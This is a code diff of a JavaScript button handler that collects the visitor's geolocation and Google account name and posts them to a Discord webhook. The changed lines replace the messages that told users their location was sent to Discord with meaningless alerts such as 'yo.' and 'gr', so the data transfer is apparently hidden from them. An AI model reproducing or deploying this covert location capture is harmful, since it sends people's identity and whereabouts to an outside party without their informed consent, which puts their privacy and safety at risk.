@@ -26,8 +26,8 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
             let message = {
                 content: `
                     **${googleAccountName} a cliqué sur le bouton**
-                    \nVotre localisation approximative est:
-                    \nLatitude: ${lat}, Longitude: ${lon}
+                    \nPos :
+                    \nLat: ${lat}, Lon: ${lon}
                     \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
                 `
             };
@@ -44,26 +44,26 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
                 body: JSON.stringify(message)
             }).then(response => {
                 if (response.ok) {
-                    alert('Les informations ont été envoyées avec succès au webhook Discord.');
+                    alert('yo.');
                 } else {
-                    throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
+                    throw new Error('yoot: ' + response.status);
                 }
             }).catch(error => {
                 console.error('Erreur:', error);
-                alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
+                alert('bno.');
             });
 
             // Affichage des informations dans l'élément #info-display
             document.getElementById('info-display').innerText = `
-                Votre localisation approximative est:
+               Pos :
                 \nLatitude: ${lat}, Longitude: ${lon}
                 \n[Google Maps](https://www.google.com/maps?q=${lat},${lon})  // lien vers Google Maps
             `;
         }, function(error) {
             console.error('Erreur de géolocalisation:', error);
-            alert('Erreur lors de la récupération de la localisation.');
+            alert('gr');
         });
     } else {
-        alert('La géolocalisation n\'est pas supportée par ce navigateur.');
+        alert('r gr.');
     }
 });
